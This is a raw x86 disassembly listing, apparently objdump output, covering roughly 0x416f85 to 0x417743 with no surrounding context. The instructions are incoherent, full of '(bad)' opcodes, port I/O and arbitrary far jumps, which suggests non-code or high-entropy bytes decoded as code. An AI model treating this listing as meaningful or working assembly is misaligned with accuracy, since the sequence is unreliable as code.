  416f85:	cmp    esi,esi
  416f87:	div    DWORD PTR [ecx-0x7a92530]
  416f8d:	dec    ebx
  416f8e:	mov    eax,0x7ac5e2ff
  416f93:	dec    esp
  416f94:	xchg   BYTE PTR [ebx+0x6f],bl
  416f97:	push   ebx
  416f98:	leave  
  416f99:	cli    
  416f9a:	jo     0x416f80
  416f9c:	out    dx,eax
  416f9d:	jnp    0x416fd9
  416f9f:	mov    ds:0x996d0216,eax
  416fa4:	fstp   DWORD PTR [eax+0x72af4a97]
  416faa:	add    DWORD PTR [edi+0x44],ecx
  416fad:	int    0x92
  416faf:	adc    DWORD PTR [eax+0x6df8cfc5],edx
  416fb5:	pop    ds
  416fb6:	pop    eax
  416fb7:	adc    edi,DWORD PTR [esi-0x1ef29972]
  416fbd:	(bad)  [ecx+0x4b50b3fa]
  416fc3:	pop    ss
  416fc4:	test   DWORD PTR [edx+0x6da3a240],eax
  416fca:	xlat   BYTE PTR ds:[ebx]
  416fcb:	xchg   ecx,eax
  416fcc:	aam    0x3d
  416fce:	test   DWORD PTR [eax-0x36],ecx
  416fd1:	jmp    FWORD PTR [ebp+0x24aa6e48]
  416fd7:	aad    0xe6
  416fd9:	mov    eax,DWORD PTR [edi-0x206bde2b]
  416fdf:	outs   dx,BYTE PTR ds:[esi]
  416fe0:	ror    DWORD PTR [ecx-0x638f20dd],0xa
  416fe7:	cs in  eax,0x4c
  416fea:	add    BYTE PTR [esi+edx*2+0x260eab16],dh
  416ff1:	jle    0x417007
  416ff3:	cli    
  416ff4:	pop    ds
  416ff5:	into   
  416ff6:	daa    
  416ff7:	adc    eax,0x188827df
  416ffc:	in     al,0xa8
  416ffe:	push   ss
  416fff:	(bad)  
  417000:	pushf  
  417001:	jg     0x416fae
  417003:	or     eax,0x5e096789
  417008:	jecxz  0x416fe0
  41700a:	sbb    eax,0x56b86af6
  41700f:	aam    0xe6
  417011:	or     ch,bh
  417013:	mov    edi,0xd6adff1c
  417018:	mov    ds:0x6fb4b4b7,eax
  41701d:	sbb    DWORD PTR [esi],eax
  41701f:	or     eax,0x3fc2dd77
  417024:	inc    ebp
  417025:	imul   DWORD PTR [ecx]
  417027:	xchg   ecx,eax
  417028:	sub    eax,0x912d4ad8
  41702d:	push   eax
  41702e:	sbb    BYTE PTR [esi-0x1c9fe30e],al
  417034:	pop    ss
  417035:	call   0x1f077078
  41703a:	jmp    0x417028
  41703c:	jb     0x41705d
  41703e:	pop    edi
  41703f:	outs   dx,BYTE PTR ds:[esi]
  417040:	outs   dx,BYTE PTR ds:[esi]
  417041:	adc    BYTE PTR [esi],cl
  417043:	sub    ah,BYTE PTR [edx-0x37192506]
  417049:	xor    cl,BYTE PTR [ecx+0x77]
  41704c:	sahf   
  41704d:	push   ebp
  41704e:	cmc    
  41704f:	in     al,0x46
  417051:	aas    
  417052:	sbb    BYTE PTR [edx],ah
  417054:	shr    DWORD PTR [ebp+0x4a852c1e],0x2a
  41705b:	pushf  
  41705c:	mov    esp,0x6b7e6aa9
  417061:	out    dx,eax
  417062:	(bad)  
  417063:	mov    al,0x49
  417065:	stos   DWORD PTR es:[edi],eax
  417066:	shl    BYTE PTR [edx-0x69],cl
  417069:	push   es
  41706a:	mov    ebx,0x215a3159
  41706f:	fnstcw WORD PTR [ebx-0x69]
  417072:	sbb    DWORD PTR [eax+0x77333706],ebp
  417078:	push   0xfffffff7
  41707a:	mov    bl,0x1e
  41707c:	sub    al,dh
  41707e:	aas    
  41707f:	in     eax,0x7d
  417081:	sub    DWORD PTR [ecx-0x50],0x477065aa
  417088:	cmp    al,0x14
  41708a:	imul   eax,DWORD PTR [ebx-0x7faf30e0],0x73097871
  417094:	and    al,0x35
  417096:	ins    DWORD PTR es:[edi],dx
  417097:	inc    edi
  417098:	out    dx,eax
  417099:	jge    0x4170dc
  41709b:	popa   
  41709c:	shr    BYTE PTR [ecx],0x5
  41709f:	mov    dl,0x36
  4170a1:	lods   eax,DWORD PTR ds:[esi]
  4170a2:	cdq    
  4170a3:	ror    BYTE PTR [edx-0x13],0x23
  4170a7:	xor    DWORD PTR [ebx+0x13],edx
  4170aa:	pop    di
  4170ac:	enter  0xc073,0x74
  4170b0:	dec    esi
  4170b1:	(bad)  
  4170b2:	adc    al,0x4a
  4170b4:	or     BYTE PTR [edi+0x30],ah
  4170b7:	inc    edi
  4170b8:	rcl    BYTE PTR [ebx],cl
  4170ba:	inc    esi
  4170bb:	ds popa 
  4170bd:	mov    esp,DWORD PTR [esi]
  4170bf:	les    edx,FWORD PTR [ebx]
  4170c1:	fs retf 
  4170c3:	dec    eax
  4170c4:	push   esi
  4170c5:	xchg   BYTE PTR [edx],dh
  4170c7:	cmp    al,0x28
  4170c9:	ror    DWORD PTR [ebx],0xa4
  4170cc:	sbb    BYTE PTR [esi-0x12],bl
  4170cf:	pop    es
  4170d0:	pop    ss
  4170d1:	call   FWORD PTR [ebp+0x21]
  4170d4:	call   0x455f8b5d
  4170d9:	pop    edi
  4170da:	sub    DWORD PTR [ebx],eax
  4170dc:	dec    eax
  4170dd:	(bad)  
  4170de:	rol    BYTE PTR [eax-0xadcad6f],1
  4170e4:	fs ret 
  4170e6:	ret    0x166b
  4170e9:	aam    0x82
  4170eb:	push   0x55
  4170ed:	adc    BYTE PTR [esi-0x36b05c94],0x35
  4170f4:	fstp   st(4)
  4170f6:	mov    fs,WORD PTR [edx+0xdcd4db3]
  4170fc:	push   ss
  4170fd:	cdq    
  4170fe:	ss in  eax,0xd2
  417101:	inc    ebx
  417102:	sti    
  417103:	jo     0x41708f
  417105:	push   ebp
  417106:	cwde   
  417107:	mov    eax,fs
  417109:	mov    ecx,0x9d5dfa3c
  41710e:	pop    edi
  41710f:	xchg   edi,eax
  417110:	adc    cl,ch
  417112:	jo     0x4170bb
  417114:	mov    ecx,DWORD PTR [edx+0x3a]
  417117:	dec    esi
  417118:	push   ecx
  417119:	dec    ebp
  41711a:	mov    eax,ds:0x6d31ebe2
  41711f:	sub    ebx,DWORD PTR [edx]
  417121:	fcomp  DWORD PTR [esi]
  417123:	call   0xa0092018
  417128:	ret    0xfd3b
  41712b:	int3   
  41712c:	xor    edi,DWORD PTR [edx+0x45]
  41712f:	sub    edi,DWORD PTR [eax+0x41]
  417132:	adc    DWORD PTR [ebx-0x9714f44],0xeb243b77
  41713c:	pushf  
  41713d:	call   0x740f219f
  417142:	shr    BYTE PTR [edi-0x3320c1f3],1
  417148:	xor    DWORD PTR [ebx+esi*4-0x169dc434],ebp
  41714f:	pushf  
  417150:	and    BYTE PTR fs:[ebp+0x557848d1],0x41
  417158:	cmp    bl,BYTE PTR [eax]
  41715a:	ret    0x20c7
  41715d:	pop    ecx
  41715e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41715f:	mov    cl,0x64
  417161:	pop    esp
  417162:	(bad)  
  417163:	iret   
  417164:	retf   
  417165:	jmp    0x112:0x89ee3d0d
  41716c:	in     al,dx
  41716d:	xlat   BYTE PTR ds:[ebx]
  41716e:	inc    edi
  41716f:	das    
  417170:	jb     0x4171d4
  417172:	xchg   esp,eax
  417173:	mov    ds:0xdbd27af9,eax
  417178:	test   ah,ah
  41717a:	and    eax,0x3de5d166
  41717f:	and    esi,esi
  417181:	fsincos 
  417183:	loopne 0x4171b5
  417185:	(bad)  
  417186:	or     ebp,DWORD PTR [ebx+0x3b207b87]
  41718c:	xchg   edi,eax
  41718d:	adc    eax,0xfc1e8bb7
  417192:	das    
  417193:	jmp    DWORD PTR [eax+0x4b]
  417196:	repz cmp eax,ecx
  417199:	mov    dl,0x78
  41719b:	mov    al,ds:0x91cc9e71
  4171a0:	fwait
  4171a1:	stos   DWORD PTR es:[edi],eax
  4171a2:	inc    ebx
  4171a3:	and    eax,DWORD PTR ds:0x8f98334a
  4171a9:	je     0x41715b
  4171ab:	test   DWORD PTR [ecx],esp
  4171ad:	dec    ebp
  4171ae:	xchg   ebx,esp
  4171b0:	jmp    0x8c73:0x1deb7a01
  4171b7:	push   esi
  4171b8:	inc    DWORD PTR [ebp+0x57]
  4171bb:	jp     0x41714f
  4171bd:	sbb    BYTE PTR [ebp+ecx*8+0x1b],bh
  4171c1:	pusha  
  4171c2:	sub    ecx,DWORD PTR ds:0x15e1a0c9
  4171c8:	dec    esi
  4171c9:	pop    ds
  4171ca:	fsub   st,st(3)
  4171cc:	dec    edi
  4171cd:	data16 je 0x41724c
  4171d0:	jge    0x417158
  4171d2:	frstor [esi-0x17]
  4171d5:	cmp    dl,BYTE PTR [ebp+0x4f14b1d3]
  4171db:	jnp    0x417226
  4171dd:	xor    eax,0x823f345d
  4171e2:	add    ebx,edx
  4171e4:	sub    edi,edi
  4171e6:	call   0xa5088a15
  4171eb:	imul   ecx,DWORD PTR [eax+0x3682657f],0x516426a8
  4171f5:	nop    DWORD PTR [ebx+0x7d17005e]
  4171fc:	ror    DWORD PTR [esi+0x33],cl
  4171ff:	(bad)  
  417200:	adc    al,0x13
  417202:	cdq    
  417203:	in     eax,dx
  417204:	xor    BYTE PTR [ebp-0x5a],dh
  417207:	in     eax,0x39
  417209:	(bad)  
  41720b:	test   DWORD PTR [ecx+0x7ff799b1],0x50ed71f2
  417215:	imul   eax,DWORD PTR [esi],0x13
  417218:	xor    eax,0x4dbdd0e7
  41721d:	cmp    dl,0x19
  417220:	xchg   al,dl
  417222:	(bad)  
  417223:	push   0x71
  417225:	pop    ss
  417226:	dec    eax
  417227:	push   ss
  417228:	dec    edx
  417229:	mov    cl,0x5e
  41722b:	push   esi
  41722c:	gs push ds
  41722e:	shl    BYTE PTR [edi],0xac
  417231:	mov    ebp,DWORD PTR [ecx+0x1a]
  417234:	pushf  
  417235:	xchg   DWORD PTR [ebp+0x4b014ba],edx
  41723b:	mov    ecx,0x3434a13
  417240:	sbb    al,0x1a
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	xlat   BYTE PTR ds:[ebx]
  417255:	inc    edi
  417256:	xor    esi,DWORD PTR [edx+0x70]
  417259:	es jg  0x4172cc
  41725c:	mov    ecx,0xfc70707e
  417261:	ds call 0x516d:0x201164e8
  417269:	inc    edi
  41726a:	mov    esi,ds
  41726c:	push   ecx
  41726d:	push   ebp
  41726e:	mov    al,ds:0xf407392f
  417273:	mov    dh,0xdf
  417275:	mov    dh,BYTE PTR [esi]
  417277:	inc    esi
  417278:	mov    ch,0x91
  41727a:	sbb    al,0x5
  41727c:	xchg   esp,eax
  41727d:	jne    0x417243
  41727f:	xchg   DWORD PTR [edi],ebx
  417281:	push   esi
  417282:	inc    ebx
  417283:	aad    0x87
  417285:	pop    esp
  417286:	test   eax,0x5e0ed3a1
  41728b:	int    0x94
  41728d:	pop    esp
  41728e:	popf   
  41728f:	push   0x4e
  417291:	jo     0x417248
  417293:	bound  esp,QWORD PTR [esi]
  417295:	jmp    0xd18e:0x6bd84c40
  41729c:	mov    eax,ds:0x8aae5dd8
  4172a1:	adc    DWORD PTR [ebx],esi
  4172a3:	jns    0x417310
  4172a5:	and    eax,0xa0e6d005
  4172aa:	xor    al,0xff
  4172ac:	mov    ds:0xfdead0ed,eax
  4172b1:	pop    ecx
  4172b2:	jg     0x417251
  4172b4:	ficom  WORD PTR [esi]
  4172b6:	push   edi
  4172b7:	adc    edi,ebx
  4172b9:	push   es
  4172ba:	popa   
  4172bb:	dec    ecx
  4172bc:	aad    0xae
  4172be:	icebp  
  4172bf:	bound  edi,QWORD PTR [ecx+0x6a9d94db]
  4172c5:	xlat   BYTE PTR ds:[ebx]
  4172c6:	aas    
  4172c7:	sub    ch,dh
  4172c9:	mov    bl,0x2
  4172cb:	fiadd  DWORD PTR [edx+0x5f7e19ac]
  4172d1:	int    0x59
  4172d3:	je     0x417307
  4172d5:	inc    ebp
  4172d6:	fcomp  DWORD PTR [edx-0x59]
  4172d9:	add    al,0xf9
  4172db:	sub    BYTE PTR [eax-0x35adc2c4],dh
  4172e1:	xchg   esp,eax
  4172e2:	push   ebx
  4172e3:	in     al,dx
  4172e4:	xchg   esp,eax
  4172e5:	add    BYTE PTR [ebp-0x26606f95],0xdf
  4172ec:	loopne 0x4172e4
  4172ee:	mov    ebx,0x6fa58c3b
  4172f3:	daa    
  4172f4:	or     DWORD PTR [edi],0xfffffffa
  4172f7:	sub    dh,BYTE PTR [ecx-0x76ed938e]
  4172fd:	pop    edx
  4172fe:	lods   eax,DWORD PTR ds:[esi]
  4172ff:	in     eax,0xf7
  417301:	inc    esp
  417302:	popa   
  417303:	mov    al,0x5c
  417305:	or     DWORD PTR [ecx+0x7638d724],ebx
  41730b:	inc    ebx
  41730c:	mov    eax,gs:0x47eb16c0
  417312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417313:	mov    eax,ds:0xae6aac79
  417318:	das    
  417319:	mov    ah,0x20
  41731b:	std    
  41731c:	dec    esp
  41731d:	jmp    0xd047e9a1
  417322:	arpl   bx,ax
  417324:	cmc    
  417325:	pop    ebx
  417326:	add    DWORD PTR [edi+0x49e34e03],ebp
  41732c:	and    al,0xd3
  41732e:	push   0xffffff85
  417330:	repnz sub DWORD PTR ds:0x3d64ea83,ecx
  417337:	jl     0x41738b
  417339:	sub    DWORD PTR [ebx+0x2d],eax
  41733c:	push   bp
  41733e:	in     eax,0xe9
  417340:	or     BYTE PTR [eax],dh
  417342:	mov    ebp,0x408387fb
  417347:	push   ecx
  417348:	scas   al,BYTE PTR es:[edi]
  417349:	in     al,dx
  41734a:	cmp    eax,0x135cb2cb
  41734f:	lods   eax,DWORD PTR gs:[esi]
  417351:	fsub   st(4),st
  417353:	aam    0x41
  417355:	mov    ds:0xeafcca9a,al
  41735b:	ins    BYTE PTR es:[edi],dx
  41735c:	push   esp
  41735d:	and    DWORD PTR [edi-0x15],ebp
  417360:	push   edx
  417361:	(bad)  
  417363:	pop    ecx
  417364:	jnp    0x4172ff
  417366:	add    BYTE PTR [esi],dl
  417368:	xchg   ebp,eax
  417369:	gs inc ebx
  41736b:	mov    ebp,0x79b9dcb9
  417370:	in     al,dx
  417371:	push   edx
  417372:	jb     0x4173bc
  417374:	mov    al,0x58
  417376:	push   edi
  417377:	or     al,0xd9
  417379:	or     DWORD PTR [edx],edx
  41737b:	inc    edx
  41737c:	or     eax,0xfe4948f5
  417381:	and    DWORD PTR [ecx+0x66],ebx
  417384:	scas   eax,DWORD PTR es:[edi]
  417385:	popf   
  417386:	cmp    edi,edx
  417388:	pop    ecx
  417389:	ror    dl,1
  41738b:	and    BYTE PTR ds:0x6a862f92,0x33
  417392:	pushf  
  417393:	push   ebp
  417394:	and    eax,esi
  417396:	fwait
  417397:	jnp    0x41737f
  417399:	int3   
  41739a:	cmp    dl,ch
  41739c:	cli    
  41739d:	inc    edx
  41739e:	je     0x417334
  4173a0:	xor    al,0xa6
  4173a2:	dec    eax
  4173a3:	scas   eax,DWORD PTR es:[edi]
  4173a4:	mov    eax,ds:0x2735b47
  4173aa:	add    ah,BYTE PTR [ebp+edi*4-0x79]
  4173ae:	ror    BYTE PTR [eax-0x3d],0xe3
  4173b2:	dec    edi
  4173b3:	or     al,0xf9
  4173b5:	(bad)  
  4173b6:	pop    ss
  4173b7:	or     DWORD PTR [bx-0x293],ebp
  4173bc:	mov    eax,DWORD PTR [edi+ebx*2-0x11]
  4173c0:	rcr    DWORD PTR [edi+0x78476587],cl
  4173c6:	and    eax,edx
  4173c8:	push   esi
  4173c9:	jecxz  0x4173cf
  4173cb:	mov    ds:0x9acb14b4,eax
  4173d0:	mov    al,0x39
  4173d2:	push   ebp
  4173d3:	outs   dx,BYTE PTR ds:[esi]
  4173d4:	xchg   esi,eax
  4173d5:	xlat   BYTE PTR ds:[ebx]
  4173d6:	pusha  
  4173d7:	fcom   DWORD PTR [ebx-0x44]
  4173da:	std    
  4173db:	fs mov cl,0xc0
  4173de:	into   
  4173df:	xlat   BYTE PTR ds:[ebx]
  4173e0:	and    eax,0x11b2fd09
  4173e5:	and    ecx,ebx
  4173e7:	jne    0x4173eb
  4173e9:	stc    
  4173ea:	scas   eax,DWORD PTR es:[edi]
  4173eb:	or     eax,0x2c51416e
  4173f0:	xchg   ecx,eax
  4173f1:	mov    es,WORD PTR [eax-0x5b21a2b6]
  4173f7:	mov    ebp,ebp
  4173f9:	out    0xe9,eax
  4173fb:	(bad)  [ecx]
  4173fd:	addr16 or eax,0x5f45de46
  417403:	ret    
  417404:	add    al,0x2a
  417406:	sub    al,0x96
  417408:	enter  0xc813,0x23
  41740c:	stos   BYTE PTR es:[edi],al
  41740d:	(bad)  
  41740f:	in     eax,0xda
  417411:	retf   0x23d5
  417414:	push   es
  417415:	mov    ecx,cs
  417417:	outs   dx,BYTE PTR ds:[esi]
  417418:	mov    bl,0x10
  41741a:	xchg   BYTE PTR [edx-0x522895e1],bl
  417420:	pop    eax
  417421:	das    
  417422:	mov    ds:0x6a4e8d11,eax
  417427:	imul   edi,DWORD PTR [ebx],0x40
  41742a:	sub    edi,DWORD PTR [ecx]
  41742c:	sub    DWORD PTR [ebx+ebp*4],edx
  41742f:	push   es
  417430:	push   edx
  417431:	dec    eax
  417432:	and    bh,0xf2
  417435:	push   ebp
  417436:	dec    esi
  417437:	das    
  417438:	sbb    dl,BYTE PTR [edi+0x3f084305]
  41743e:	inc    ebx
  41743f:	hlt    
  417440:	mov    ds:0xa2839454,al
  417445:	ror    edi,0x51
  417448:	arpl   bx,ax
  41744a:	inc    esi
  41744b:	sbb    eax,0xdd88c2a2
  417450:	or     BYTE PTR [eax+0xb6cd4f2],cl
  417456:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  417458:	dec    edi
  417459:	sub    al,ch
  41745b:	pop    esp
  41745c:	jo     0x417402
  41745e:	xchg   edi,eax
  41745f:	mov    bh,0x8d
  417461:	xchg   esp,eax
  417462:	scas   eax,DWORD PTR es:[edi]
  417463:	(bad)  
  417464:	jb     0x4174a4
  417466:	int    0x82
  417468:	scas   eax,DWORD PTR es:[edi]
  417469:	imul   ecx,esi,0xffffffc0
  41746c:	lea    edx,[edi+ebp*8+0x36]
  417470:	mov    edx,0xde211275
  417475:	add    al,0x12
  417477:	ins    BYTE PTR es:[edi],dx
  417478:	or     cl,BYTE PTR [esp+ecx*8-0x2f]
  41747c:	pop    ecx
  41747d:	bound  esp,QWORD PTR [eax+0x3e114427]
  417483:	(bad)  
  417484:	(bad)  
  417485:	sub    edi,esp
  417487:	retf   
  417488:	pop    edi
  417489:	or     eax,0xd39311c2
  41748e:	ss xor eax,0xf7006ce
  417494:	sahf   
  417495:	ja     0x4174c3
  417497:	jecxz  0x4174b3
  417499:	fcomp  st(6)
  41749b:	ret    
  41749c:	add    al,0x62
  41749e:	std    
  41749f:	adc    cl,BYTE PTR [ebx-0xd015beb]
  4174a5:	mov    dh,0xec
  4174a7:	pop    ecx
  4174a8:	or     al,0x41
  4174aa:	retf   0xb443
  4174ad:	mov    ecx,0xbc1ef0b6
  4174b2:	aad    0xb6
  4174b4:	hlt    
  4174b5:	mov    ebx,0x9ba66cb3
  4174ba:	aas    
  4174bb:	dec    esi
  4174bc:	fidiv  DWORD PTR [esi-0x2ab81a1c]
  4174c2:	sahf   
  4174c3:	jecxz  0x41753a
  4174c5:	dec    ecx
  4174c6:	lods   eax,DWORD PTR ds:[esi]
  4174c7:	call   0x566035a3
  4174cc:	ins    BYTE PTR es:[edi],dx
  4174cd:	aas    
  4174ce:	lods   al,BYTE PTR ds:[esi]
  4174cf:	stos   BYTE PTR es:[edi],al
  4174d0:	sbb    eax,0x91d73a5d
  4174d5:	pop    ss
  4174d6:	icebp  
  4174d7:	sbb    al,0xd
  4174d9:	idiv   BYTE PTR [esi-0x1f0a3589]
  4174df:	fstp   DWORD PTR [ecx+0x2809b99c]
  4174e5:	xor    ecx,DWORD PTR [esp+eiz*8+0x33]
  4174e9:	mov    edi,0xb47a3db1
  4174ee:	dec    edi
  4174ef:	nop
  4174f0:	retf   0x4f83
  4174f3:	shl    ebx,1
  4174f5:	add    cl,al
  4174f7:	rcl    ecx,cl
  4174f9:	inc    edx
  4174fa:	inc    edx
  4174fb:	imul   esi,edi,0x64
  4174fe:	inc    edi
  4174ff:	xchg   edi,eax
  417500:	imul   ebp,DWORD PTR [esi+0x755103e1],0x5b
  417507:	xchg   ebp,eax
  417508:	outs   dx,BYTE PTR ss:[esi]
  41750a:	fdivr  DWORD PTR [edx]
  41750c:	jecxz  0x417577
  41750e:	jg     0x4174cc
  417510:	sub    al,0x34
  417512:	cdq    
  417513:	inc    esi
  417514:	adc    BYTE PTR [edi-0x306cd02d],dl
  41751a:	sahf   
  41751b:	cmp    edx,DWORD PTR [ebp+0x4d]
  41751e:	mov    dh,0x22
  417520:	inc    ebp
  417521:	sbb    BYTE PTR [edx],al
  417523:	les    ebx,FWORD PTR [ebx+ebx*4+0x1d23351]
  41752a:	pop    ebp
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [edx+0x58],ecx
  417544:	int    0x1
  417546:	mov    ecx,0xb9707f24
  41754b:	jle    0x4175bd
  41754d:	jo     0x417587
  41754f:	xor    esi,DWORD PTR [edx]
  417551:	fcomip st,st(6)
  417553:	sbb    DWORD PTR [esi-0x17894c3e],esp
  417559:	cmp    DWORD PTR [esi-0x12],esp
  41755c:	outs   dx,BYTE PTR ds:[esi]
  41755d:	mov    cl,0x3
  41755f:	add    BYTE PTR [eax+0x4b392e61],dh
  417565:	inc    ecx
  417566:	jno    0x417570
  417568:	out    dx,eax
  417569:	xchg   edi,eax
  41756a:	inc    ecx
  41756b:	int    0xf1
  41756d:	sub    eax,0x1f6a770e
  417572:	std    
  417573:	cmp    eax,DWORD PTR [esp+esi*4-0x7]
  417577:	adc    al,0x86
  417579:	xor    cl,BYTE PTR [esi+0xd]
  41757c:	cli    
  41757d:	or     al,0xca
  41757f:	test   BYTE PTR [ecx+0x2f],cl
  417582:	add    al,BYTE PTR [ecx]
  417584:	into   
  417585:	scas   eax,DWORD PTR es:[edi]
  417586:	and    al,0xb
  417588:	fild   DWORD PTR [eax+0x6b715071]
  41758e:	popa   
  41758f:	iret   
  417590:	jnp    0x4175c9
  417592:	jmp    0xb76a:0xcd294c44
  417599:	jmp    0xb6bf5c5d
  41759e:	xchg   esi,eax
  41759f:	sub    edi,DWORD PTR [ecx]
  4175a1:	aam    0x9a
  4175a3:	mov    dh,0x7f
  4175a5:	push   ebx
  4175a6:	adc    bh,BYTE PTR [edx-0x7af978c2]
  4175ac:	push   ecx
  4175ad:	outs   dx,DWORD PTR cs:[esi]
  4175af:	push   ecx
  4175b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175b1:	mov    ds:0x78ddcd9e,al
  4175b6:	push   ecx
  4175b7:	jl     0x4175ee
  4175b9:	xor    BYTE PTR [eax+ecx*8],ch
  4175bc:	ret    
  4175bd:	pop    eax
  4175be:	stos   BYTE PTR es:[edi],al
  4175bf:	xlat   BYTE PTR es:[ebx]
  4175c1:	into   
  4175c2:	push   cs
  4175c3:	or     DWORD PTR [ebx-0x2da4d141],0xb693d892
  4175cd:	add    bh,bl
  4175cf:	pop    ss
  4175d0:	into   
  4175d1:	jno    0x4175b3
  4175d3:	lods   eax,DWORD PTR ds:[esi]
  4175d4:	shl    DWORD PTR [ecx+edx*2-0x101d7b1a],0x7c
  4175dc:	pushf  
  4175dd:	push   eax
  4175de:	shl    BYTE PTR [esi],cl
  4175e0:	imul   eax,DWORD PTR [ebp-0x25],0x7b
  4175e4:	or     cl,ah
  4175e6:	inc    DWORD PTR [esi-0x5b]
  4175e9:	pop    esi
  4175ea:	fiadd  DWORD PTR [esi]
  4175ec:	dec    esi
  4175ed:	jbe    0x4175cd
  4175ef:	mov    dl,0x18
  4175f1:	dec    eax
  4175f2:	cmp    BYTE PTR [ecx],ah
  4175f4:	adc    eax,0xb0a10e3b
  4175f9:	ss xchg esi,eax
  4175fb:	jmp    DWORD PTR [edi]
  4175fd:	imul   ebp,DWORD PTR [esi+0x44],0x5ec0600f
  417604:	stc    
  417605:	lds    ebx,FWORD PTR [esi+0x6656e2e]
  41760b:	jge    0x4175c9
  41760d:	and    DWORD PTR [ecx+0x7293a851],ebp
  417613:	lods   eax,DWORD PTR ds:[esi]
  417614:	pop    eax
  417615:	ins    DWORD PTR es:[edi],dx
  417616:	(bad)  
  417617:	test   DWORD PTR [ebx*2-0x36b7a01c],0x18aea5ab
  417622:	jns    0x41768d
  417624:	lods   eax,DWORD PTR ds:[esi]
  417625:	stos   DWORD PTR es:[edi],eax
  417626:	pop    ebx
  417627:	mov    ebx,0xb9f93bc7
  41762c:	push   ebp
  41762d:	push   ebx
  41762e:	xchg   ebp,eax
  41762f:	aad    0xb
  417631:	xor    BYTE PTR [ecx-0x44f56bd5],cl
  417637:	mov    esi,DWORD PTR [edi*8-0x21968fda]
  41763e:	dec    esi
  41763f:	ret    
  417640:	jo     0x4176a1
  417642:	cmc    
  417643:	and    ah,0xa3
  417646:	shl    BYTE PTR [ecx+0x1d4affb5],1
  41764c:	or     al,0xb1
  41764e:	xchg   ebx,eax
  41764f:	push   0xe3ecfc2
  417654:	jge    0x417674
  417656:	mov    ah,0x36
  417658:	sub    eax,0xa79a6e6b
  41765d:	xchg   DWORD PTR [esp+edi*2+0x61],eax
  417661:	fistp  DWORD PTR [eax]
  417663:	and    dl,0xfb
  417666:	dec    ecx
  417667:	jns    0x4176e3
  417669:	stos   BYTE PTR es:[edi],al
  41766a:	sub    BYTE PTR [ebx+0x25],dh
  41766d:	icebp  
  41766e:	adc    eax,0x536d372
  417673:	test   DWORD PTR [ebx+edi*8+0x3a47d551],edx
  41767a:	xchg   edx,eax
  41767b:	xor    eax,0xc599a1b4
  417680:	cmp    DWORD PTR [ebx],edi
  417682:	add    bl,BYTE PTR ds:0xd1495319
  417688:	or     al,0x94
  41768a:	or     eax,0x2fbfd700
  41768f:	outs   dx,BYTE PTR ds:[esi]
  417690:	cmp    al,0x58
  417693:	push   esp
  417694:	nop
  417695:	stos   BYTE PTR es:[edi],al
  417696:	xor    DWORD PTR [edi],eax
  417698:	push   ss
  417699:	mov    al,0x2a
  41769b:	inc    esi
  41769c:	push   eax
  41769d:	jns    0x4176a3
  41769f:	xlat   BYTE PTR ds:[ebx]
  4176a0:	(bad)  
  4176a1:	ins    BYTE PTR es:[edi],dx
  4176a2:	clc    
  4176a3:	mov    ch,0x8d
  4176a5:	mov    ch,0x50
  4176a7:	dec    ebp
  4176a8:	adc    BYTE PTR [esi],al
  4176aa:	cmp    ebp,DWORD PTR [edx]
  4176ac:	das    
  4176ad:	dec    ebx
  4176ae:	lods   al,BYTE PTR ds:[esi]
  4176af:	ins    BYTE PTR es:[edi],dx
  4176b0:	ins    DWORD PTR es:[edi],dx
  4176b1:	mov    ds:0x76fa693,eax
  4176b6:	xchg   esp,eax
  4176b7:	out    0x1,al
  4176b9:	fcom   QWORD PTR [edi-0x2840db79]
  4176bf:	jle    0x417663
  4176c1:	jmp    DWORD PTR [edi]
  4176c3:	mul    DWORD PTR [ecx]
  4176c5:	loope  0x4176e6
  4176c7:	sahf   
  4176c8:	(bad)  
  4176c9:	shr    BYTE PTR [edi],cl
  4176cb:	gs stos BYTE PTR es:[edi],al
  4176cd:	stos   BYTE PTR es:[edi],al
  4176ce:	mov    bh,0x13
  4176d0:	jecxz  0x4176d9
  4176d2:	dec    ebx
  4176d3:	ficom  WORD PTR [eax-0x3e71168c]
  4176d9:	xsha1  (bad)
  4176da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176db:	dec    edx
  4176dc:	outs   dx,BYTE PTR ds:[esi]
  4176dd:	sub    eax,0x2df9cc30
  4176e2:	push   ebx
  4176e3:	jne    0x41774a
  4176e5:	xchg   BYTE PTR [ebp+0x56],bh
  4176e8:	rol    BYTE PTR [ecx],0xcb
  4176eb:	and    BYTE PTR [edi],dl
  4176ed:	mov    dl,0xaf
  4176ef:	fstp   QWORD PTR [esi+0x25]
  4176f2:	or     ebx,DWORD PTR [esi]
  4176f4:	jb     0x41769b
  4176f6:	or     BYTE PTR [ebp-0x1182edb3],ah
  4176fc:	mov    fs,WORD PTR ds:0x142d6496
  417702:	mov    ah,0x2c
  417704:	(bad)  
  417705:	push   0xffffffcc
  417707:	arpl   WORD PTR [ecx+0x59],di
  41770a:	sti    
  41770b:	ins    DWORD PTR es:[edi],dx
  41770c:	in     eax,0xfd
  41770e:	cmp    ch,dl
  417710:	enter  0x654f,0xd2
  417714:	pop    edi
  417715:	out    dx,al
  417716:	bound  ebp,QWORD PTR [esi]
  417718:	sbb    BYTE PTR [ecx+0x1ead459],al
  41771e:	mov    dl,0x35
  417720:	scas   al,BYTE PTR es:[edi]
  417721:	push   0xb
  417723:	arpl   WORD PTR [edx+0x5],bp
  417726:	icebp  
  417727:	xor    edi,DWORD PTR [edx+ebp*4-0x320e0d23]
  41772e:	mov    ds:0xb41a4dad,eax
  417733:	repz (bad) 
  417735:	xchg   ebp,eax
  417736:	stos   BYTE PTR es:[edi],al
  417737:	enter  0xd372,0xf9
  41773b:	hlt    
  41773c:	xchg   BYTE PTR [edx+0x2f82f11a],dh
  417742:	dec    esp
  417743:	icebp  
